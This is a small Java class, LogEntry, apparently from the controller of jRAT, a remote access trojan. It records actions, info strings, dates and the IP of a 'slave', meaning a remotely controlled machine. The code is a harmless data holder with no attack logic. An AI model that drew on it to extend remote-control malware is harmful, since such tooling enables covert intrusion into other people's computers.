package io.jrat.client;

import io.jrat.client.utils.Utils;

public class LogEntry {

	private String action;
	private Slave slave;
	private String info;
	private String date;

	public LogEntry(String action, Slave slave, String info) {
		this.action = action;
		this.slave = slave;
		this.info = info;
		this.date = Utils.getDate();
	}

	public String getDate() {
		return date;
	}

	public String getAction() {
		return action;
	}

	public Slave getSlave() {
		return slave;
	}

	public String getInfo() {
		return info;
	}

	public Object[] getDisplayData() {
		return new Object[] { action, slave.getIP(), info, date };
	}

}
